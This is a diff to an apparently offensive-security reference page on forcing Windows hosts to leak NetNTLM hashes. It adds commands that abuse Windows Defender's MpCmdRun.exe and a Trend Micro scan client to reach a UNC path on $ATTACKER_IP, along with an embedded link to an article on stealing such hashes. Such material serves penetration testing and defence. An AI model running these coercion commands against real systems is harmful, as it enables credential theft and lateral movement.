@@ -57,7 +57,19 @@ HTML documents can be crafted \(or injected with content when successfully explo
 
 ### Web server file inclusion
 
-[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+{% embed url="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" %}
+
+### Windows Defender MpCmdRun
+
+```bash
+C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\$ATTACKER_IP\file.txt
+```
+
+### Trend Micro Remote Scan Client
+
+```bash
+C:\Program Files (x86)\Trend Micro\OfficeScan Clien\PccNt.exe \\$ATTACKER_IP\s\
+```
 
 ### Shortcut files \(scf, lnk, url\)
 
